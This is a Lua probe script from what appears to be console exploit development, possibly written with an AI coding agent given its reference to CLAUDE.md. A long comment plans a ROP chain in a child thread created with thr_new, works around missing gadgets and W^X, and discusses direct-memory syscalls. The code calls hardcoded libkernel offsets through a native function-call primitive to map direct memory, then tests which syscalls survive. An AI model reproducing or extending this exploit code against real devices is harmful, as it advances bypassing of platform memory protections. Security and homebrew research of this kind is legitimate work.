-- CRASH_CLASS: MODERATE
-- PROBE 545a: MapDirectMemory from CHILD THREAD via thr_new ROP
--
-- RATIONALE: All probes 544g-544w show that calling MapDM from the main
-- thread (via native.fcall_with_rax) corrupts some state that makes
-- subsequent memory.read_dword/write_dword crash.
--
-- By calling MapDM from a child thread (thr_new with ROP chain), the
-- main thread's native handler stays untouched. After the child signals
-- completion via a socketpair, the main thread reads the mapped page
-- normally.
--
-- Child thread ROP chain:
-- 1. sysarch(165, SET_FSBASE=129, &fake_tcb) — fix TLS
-- 2. sceKernelAllocateDirectMemory(0, 0x150000000, 0x4000, 0x4000, 0, &phys_out)
-- 3. sceKernelMapDirectMemory(&virt_out, 0x4000, 0x33, 0x400000, phys, 0x4000)
-- 4. write(fd, &signal_byte, 1) — signal main thread
-- 5. thr_exit(431)
--
-- PROBLEM: The child can't call sceKernelAllocateDirectMemory and
-- sceKernelMapDirectMemory — they're libkernel wrappers, not raw syscalls.
-- And the child only has ROP (raw syscalls), not access to libkernel.
--
-- BUT: the child IS in the same process. Libkernel is mapped RX.
-- The child can CALL libkernel functions via its ROP chain!
-- We just need to know the function addresses (we do: alloc_fn, map_fn).
--
-- SIMPLER: Do AllocDM from main thread (this works fine).
-- Only do MapDM from child thread.
-- Then main thread reads virt_out normally.
--
-- Child needs to call map_fn(virt_out, 0x4000, 0x33, 0x400000, phys, 0x4000)
-- This is a regular C function call. In the ROP chain we need:
-- pop rdi=virt_out, pop rsi=0x4000, pop rdx=0x33, pop rcx=0x400000,
-- push phys (5th arg → r8), push 0x4000 (6th arg → r9 or stack)
-- But we have no pop_r8/pop_r9 gadgets.
--
-- WAIT: sceKernelMapDirectMemory is a C function following SysV ABI.
-- 6 args: rdi, rsi, rdx, rcx, r8, r9
-- We don't have pop_r8 or pop_r9 gadgets!
--
-- ALTERNATIVE: Call it via the native handler from the child.
-- The child can set up the fcall_stub and call native_invoke...
-- No, that's way too complex.
--
-- ALTERNATIVE 2: Find a gadget that moves a register into r8/r9.
-- Or: use the stack for args 5+6 (but SysV uses registers for first 6).
--
-- ALTERNATIVE 3: Use mmap_dmem (syscall 628) directly.
-- Wait, 628 REFUSES everything per CLAUDE.md.
--
-- ALTERNATIVE 4: The child doesn't need 6 args if we pre-set some.
-- Actually we need ALL 6 for MapDM.
--
-- ALTERNATIVE 5: Use a wrapper. Write a small ROP trampoline:
-- 1. pop rdi, pop rsi, pop rdx, pop rcx (4 args via gadgets)
-- 2. Call a wrapper that takes 4 args and internally fills r8/r9
-- But we can't write code (W^X enforced).
--
-- ALTERNATIVE 6: AllocDM from main, then build a child that:
-- 1. Calls MapDM via an indirect approach
-- Actually, the child CAN jump to map_fn with rdi/rsi/rdx/rcx set,
-- but r8/r9 will be whatever they are. If r8/r9 happen to be right...
--
-- WAIT. Let me re-read the docs. The wrapper function is:
-- int sceKernelMapDirectMemory(void **addr, size_t len, int prot,
--                              int flags, off_t offset, size_t alignment)
-- In SysV x64: rdi=addr, rsi=len, rdx=prot, rcx=flags, r8=offset, r9=alignment
--
-- BUT: the Sony wrapper may internally rearrange args before the actual syscall.
-- The REAL syscall (628 mmap_dmem) might have different arg order.
--
-- Let me try a different approach entirely: use the child thread to do
-- ONLY a write() syscall. AllocDM + MapDM from main thread (MapDM crashes
-- memory.* but doesn't crash the child thread's ability to read).
--
-- PLAN:
-- 1. Main thread: AllocDM → phys addr
-- 2. Main thread: MapDM → rv=0 (we know this works, Lua survives)
-- 3. Main thread: DON'T try to read virt_out
-- 4. Main thread: launch child thread with thr_new
-- 5. Child ROP: read 8 bytes from virt_out, write to socketpair fd
-- 6. Main thread: read socketpair → get virtual address
-- 7. Main thread: test R/W on mapped page
--
-- BUT: after MapDM, main thread CAN'T call memory.* to set up the child.
-- Need to set up child BEFORE MapDM, then launch it AFTER.
--
-- Actually: set up EVERYTHING before MapDM. The child stack, socketpair,
-- thr_param — all prepared. After MapDM, just call thr_new (via make_syscall).
-- thr_new is syscall 455 — make_syscall(455) should work.
-- Wait: does make_syscall use native handler? Let me check.
-- make_syscall creates a table cloned from syscall.pipe with a different
-- syscall_no. Calling it invokes the metatable __call, which goes through
-- the Lua syscall mechanism. In the loader, this is fn_addr based.
-- So make_syscall DOES use the native handler path.
-- And if memory.* crashes after MapDM, make_syscall probably does too.
--
-- FINAL INSIGHT: We need to launch the child BEFORE MapDM.
-- Child thread blocks on a UMTX wait. Main thread calls MapDM.
-- Then main thread signals the child (UMTX wake). Child reads virt_out
-- and writes to socketpair.
--
-- But we can't UMTX wake after MapDM if make_syscall crashes too.
--
-- OK: Let's just TEST if make_syscall(20) works after MapDM.
-- The probe 544v run 5 showed ok=true but then crashed at to_num(mrv).
-- It never reached the make_syscall test.
--
-- Let me make the ABSOLUTE minimal test: MapDM, then make_syscall(20).
-- NO access to mrv at all. Just call MapDM and immediately try getpid.

print("=== 545a: MapDM + SYSCALL ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end

if not libkernel_base then print("FATAL"); return end
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local alloc_fn = libkernel_base + uint64(0x17EF0)
local map_fn = libkernel_base + uint64(0x15020)

-- Pre-create make_syscall objects BEFORE MapDM
local sc_getpid = make_syscall(20)
local sc_write = make_syscall(4)

-- AllocDM
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
if not phys then print("NO PHYS"); return end
print("P=" .. q(phys))

-- Prepare virt_out
local virt_out = memory.alloc(8)
wq(virt_out, uint64(0))
local vo_int = to_num(virt_out)
print("VO=" .. string.format("0x%X", vo_int))

-- ========= MapDM =========
print("MAP")
io.flush()
pcall(function()
    native.fcall_with_rax(map_fn, 0,
        uint64(virt_out), uint64(0x4000), uint64(0x33),
        uint64(0x400000), phys, uint64(0x4000))
end)

-- Do NOT access return value at all
-- Just try syscalls

-- T1: Literal print
print("A")
io.flush()

-- T2: pre-created syscall object — call getpid
print("SC")
io.flush()
local ok_sc, r_sc = pcall(sc_getpid)
print("B")
io.flush()
if ok_sc then
    -- r_sc access (uint64 or number)
    print("C")
    io.flush()
    local ok_tn, tn = pcall(to_num, r_sc)
    if ok_tn then
        print(tn)
    else
        print("TN_FAIL")
    end
else
    print("SC_FAIL")
end
io.flush()

-- T3: write() syscall — write virt_out bytes to stdout (fd 1)
-- This sends 8 raw bytes from virt_out address to stdout
print("WR")
io.flush()
local ok_wr, r_wr = pcall(function()
    return sc_write(uint64(1), uint64(vo_int), uint64(8))
end)
print("D")
io.flush()
if ok_wr then
    print("WR_OK")
    local n = to_num(r_wr)
    print(n)
else
    print("WR_FAIL")
end
io.flush()

-- T4: memory.read_dword (known crash — verify)
print("RD")
io.flush()
local ok_rd, r_rd = pcall(memory.read_dword, virt_out)
if ok_rd then
    print("RD_OK")
else
    print("RD_FAIL")
end
io.flush()

print("DONE")
